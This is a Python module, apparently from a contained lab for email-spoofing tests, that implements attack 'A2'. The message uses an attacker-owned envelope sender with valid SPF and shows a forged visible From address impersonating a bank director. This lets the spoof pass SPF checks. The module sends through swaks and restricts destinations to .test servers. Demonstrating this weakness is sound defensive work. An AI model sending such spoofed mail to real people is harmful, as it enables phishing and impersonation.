"""A2 — Sobre del atacante: el sobre (MAIL FROM) usa el dominio del atacante, que tiene
un SPF válido para su IP, pero el From: visible sigue diciendo «director@bancoseguro.test».
SPF solo revisa el sobre, así que pasa: el empleado nunca ve el sobre.

Uso dentro del contenedor:  python3 -m ataques.a2_sobre_atacante [--para X] [--servidor Y]
"""

from __future__ import annotations

import argparse
import sys

from ataques.comun import (
    ALLOWED_SERVER,
    DEFAULT_RECIPIENT,
    Attack,
    AttackResult,
    DestinationError,
    send_with_swaks,
)

ATTACK = Attack(
    id="A2",
    description="Sobre del atacante",
    envelope_from="rebote@atacante.test",
    header_from="director@bancoseguro.test",
    dkim="ninguna",
)


def launch(recipient: str = DEFAULT_RECIPIENT, server: str = ALLOWED_SERVER) -> AttackResult:
    return send_with_swaks(ATTACK, recipient, server)


def main() -> int:
    parser = argparse.ArgumentParser(description=f"{ATTACK.id}: {ATTACK.description}")
    parser.add_argument("--para", default=DEFAULT_RECIPIENT, help="destinatario (.test)")
    parser.add_argument("--servidor", default=ALLOWED_SERVER, help="servidor SMTP (receptor)")
    args = parser.parse_args()
    try:
        result = launch(args.para, args.servidor)
    except DestinationError as error:
        print(f"ABORTADO: {error}", file=sys.stderr)
        return 2
    print(result.transcript)
    return 0 if result.accepted else 1


if __name__ == "__main__":
    sys.exit(main())
